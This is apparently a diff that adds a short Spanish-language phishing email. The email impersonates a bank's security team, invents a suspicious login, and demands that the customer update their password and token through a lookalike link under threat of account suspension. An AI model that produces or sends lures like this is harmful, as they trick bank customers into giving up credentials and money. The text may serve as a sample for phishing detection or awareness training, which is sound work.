@@ -1,0 +1,7 @@
+Estimado cliente,
+Detectamos intento de ingreso no reconocido en su banca en línea.
+Para evitar el bloqueo de su cuenta, verifique sus credenciales y actualice su clave y token hoy mismo.
+Use el siguiente enlace seguro: http://bancoseguro-validacion.com/cliente
+Si no confirma en 24 horas, se suspenderán transferencias y pagos.
+Atentamente,
+Equipo de Seguridad Banco Central
